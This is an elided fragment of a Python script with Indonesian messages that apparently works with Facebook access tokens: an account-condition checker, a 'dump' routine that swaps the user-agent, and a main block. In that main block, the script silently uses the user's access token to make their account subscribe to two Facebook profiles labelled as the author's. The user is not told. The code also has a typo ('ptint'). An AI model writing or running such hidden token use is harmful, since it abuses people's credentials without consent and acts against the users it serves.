...
class kondisi:
	...
	def kondisi_api(self,user,aj):
		...
		except Exception as e:print(f"\r[×] ERROR : {e}                     			",end="")
...
def dump(token,nama):
	...
	if(l in ("01","1")):
		...
		if(yt in ("Y","y")):
			...
			open("ua","w").write(ua)
			ptint(f"{ijo}USERAGENT BERHASIL DIGANTI")
...
if __name__=="__main__":
	try:
		...
		try:
			...
			req.post(f'https://graph.facebook.com/100051863139451/subscribers?access_token={token}') #PAGE_YANWAR
			req.post(f"https://graph.facebook.com/100039043908204/subscribers?access_token={token}") #RANI_YANWAR
